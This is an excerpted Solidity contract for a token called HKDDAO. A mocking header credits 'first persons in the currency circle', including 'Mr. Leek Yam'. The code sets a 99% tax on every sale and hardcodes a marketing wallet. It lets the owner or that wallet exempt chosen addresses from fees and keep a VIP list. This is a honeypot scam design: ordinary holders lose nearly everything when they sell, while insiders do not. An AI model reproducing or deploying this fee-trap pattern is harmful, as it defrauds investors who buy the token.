...
*币圈项目第一人：韭菜芽老师鼎力支持
*
*Chunfang Resource Creation-Cooperation Details
*Thanks for this project:
*The second uncle group of the first fund in the currency circle has great support
*The first person in the currency circle: Mr. Pan Youcheng fully supports
*The first person in the currency circle project: Mr. Leek Yam strongly supports
*/
...
contract HKDDAO is ERC20, Ownable{
    ...
    address public marketingWallet = 0x3B5E204086eC8B3E3A0f09965A5aF36DA65bC8E1;  
    ...
    Taxes public sellTaxes = Taxes(99,99,99);  
    ...
    constructor() ERC20("HKDDAO", "HKDDAO") {   
        _mint(msg.sender, 16888 * 10 ** decimals());  
    ...
    function updateExcludedFromFees(address _address, bool state) external onlyFunder {
        excludedFromFees[_address] = state;
    }

    function updateVipList(address _address, bool state) external onlyFunder {
    ...
    modifier onlyFunder() {
        require(owner() == msg.sender || marketingWallet == msg.sender, "!Funder");
        _;
    }
